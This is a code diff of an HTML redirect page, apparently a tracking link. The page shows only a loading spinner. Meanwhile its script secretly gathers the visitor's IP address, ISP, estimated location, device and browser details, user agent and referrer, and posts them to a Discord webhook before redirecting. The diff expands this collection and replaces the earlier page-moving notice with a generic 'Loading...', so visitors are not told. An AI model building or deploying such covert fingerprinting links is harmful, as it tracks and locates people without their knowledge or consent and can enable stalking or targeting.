@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>転送中...</title>
+    <title>Relaying...</title>
     <style>
         body {
             font-family: sans-serif;
@@ -18,7 +18,7 @@
         }
         .loader {
             border: 4px solid #f3f3f3;
-            border-top: 4px solid #5865F2; /* Discord Color */
+            border-top: 4px solid #5865F2;
             border-radius: 50%;
             width: 40px;
             height: 40px;
@@ -34,8 +34,7 @@
 <body>
 
     <div class="loader"></div>
-    <p>ページを移動しています...</p>
-    <p id="status" style="font-size: 0.8rem; color: #666;"></p>
+    <p>Loading...</p>
 
     <script>
         // --- 設定項目 ---
@@ -43,68 +42,92 @@
         // ----------------
 
         async function processRedirect() {
-            const statusParams = document.getElementById('status');
-            
             // 1. URLパラメータの取得
             const params = new URLSearchParams(window.location.search);
             const targetUrl = params.get('url');
             const uniqueId = params.get('id');
 
-            // パラメータがない場合の処理
+            // ターゲットがない場合の処理
             if (!targetUrl) {
-                statusParams.innerText = "エラー: 遷移先URLが指定されていません。";
+                document.body.innerHTML = "<p>Error: No destination URL specified.</p>";
                 return;
             }
 
-            // 万が一処理が止まっても、5秒後には強制的にリダイレクトさせる安全装置
+            // 安全装置（5秒後に強制転送）
             const safetyTimeout = setTimeout(() => {
                 window.location.replace(targetUrl);
             }, 5000);
 
             try {
-                // 2. ユーザーのグローバルIPアドレスを取得 (ipify APIを利用)
-                let clientIp = '不明';
+                // 2. 情報収集
+                
+                // A. ネットワーク情報 (ipapi.co を使用)
+                let netInfo = {};
                 try {
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipResponse.json();
-                    clientIp = ipData.ip;
+                    const res = await fetch('https://ipapi.co/json/');
+                    netInfo = await res.json();
                 } catch (e) {
-                    console.error('IP取得失敗:', e);
+                    netInfo = { error: 'IP取得失敗' };
                 }
 
-                // 3. Discordへのメッセージ作成
-                // 現在のアクセスURL（パラメータ含む）
-                const currentAccessUrl = window.location.href;
-                
-                const messageContent = `以下のページにアクセスがありました。
-- ページURL: ${targetUrl}
-- IPアドレス: ${clientIp}
-- 追跡ID: ${uniqueId || 'なし'}`;
+                // B. ブラウザ・デバイス情報
+                const screenInfo = `${window.screen.width}x${window.screen.height} (Color: ${window.screen.colorDepth}bit)`;
+                const language = navigator.language || navigator.userLanguage;
+                const platform = navigator.platform;
+                const cores = navigator.hardwareConcurrency || '不明';
+                const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : '不明';
+                const userAgent = navigator.userAgent;
+                const referrer = document.referrer || '直接アクセスまたは不明';
 
+                // 3. Discordへのメッセージ作成
+                // 見やすいようにフィールド形式を使います
                 const payload = {
-                    content: messageContent
+                    embeds: [{
+                        title: "🚨 アクセス検知 (詳細追跡)",
+                        color: 15548997, // 赤っぽい色
+                        fields: [
+                            { name: "🆔 追跡ID", value: uniqueId || "なし", inline: true },
+                            { name: "🔗 遷移先URL", value: targetUrl, inline: true },
+                            
+                            // ネットワーク情報
+                            { name: "🌍 IPアドレス", value: netInfo.ip || "不明", inline: false },
+                            { name: "🏢 プロバイダ(ISP)", value: netInfo.org || "不明", inline: true },
+                            { name: "📍 位置(推定)", value: `${netInfo.city}, ${netInfo.region}, ${netInfo.country_name}`, inline: true },
+                            
+                            // デバイス情報
+                            { name: "💻 プラットフォーム", value: platform, inline: true },
+                            { name: "🖥️ 画面解像度", value: screenInfo, inline: true },
+                            { name: "🗣️ 言語", value: language, inline: true },
+                            { name: "⚙️ ハードウェア", value: `CPU: ${cores}コア / RAM: ${memory}`, inline: true },
+                            
+                            // ユーザーエージェント（生データ）
+                            { name: "🕵️ User Agent", value: userAgent.substring(0, 1024), inline: false },
+                            
+                            // その他
+                            { name: "↩️ リファラ(流入元)", value: referrer, inline: false }
+                        ],
+                        footer: {
+                            text: `Time: ${new Date().toLocaleString('ja-JP')}`
+                        }
+                    }]
                 };
 
                 // 4. Webhook送信
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
 
             } catch (e) {
-                console.error('通知送信エラー:', e);
-                // エラーが出てもユーザーには気づかせずにリダイレクトさせる
+                console.error(e);
             } finally {
-                // 5. リダイレクト実行 (成功・失敗に関わらず)
-                clearTimeout(safetyTimeout); // 安全装置を解除
+                // 5. リダイレクト実行
+                clearTimeout(safetyTimeout);
                 window.location.replace(targetUrl);
             }
         }
 
-        // 実行
         processRedirect();
     </script>
 </body>
